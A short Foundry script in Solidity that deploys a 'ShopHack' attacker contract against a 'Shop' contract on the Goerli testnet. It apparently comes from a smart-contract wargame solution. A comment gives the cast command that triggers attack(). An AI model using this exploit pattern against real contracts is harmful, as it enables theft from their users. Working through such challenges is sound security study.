// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Shop.sol";
import "../src/ShopHack.sol";

contract ShopHackScript is Script {
  Shop public shopContract = Shop(payable(address(0xD59b3b882614df6eE6b3b34c5A75a12fA229115d)));
  ShopHack public shopHackContract;

  function setUp() public {}

  function run() public {
    uint256 attacker = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(attacker);
    // Just deploying, will attack from command line w/: 
    // cast send --private-key $PRIVATE_KEY --rpc-url $GOERLI_RPC_URL 0x19e5068b7c06f73c991d4c2ac3031b3bace4332b "attack()"
    shopHackContract = new ShopHack(address(shopContract));

    vm.stopBroadcast();
  }
}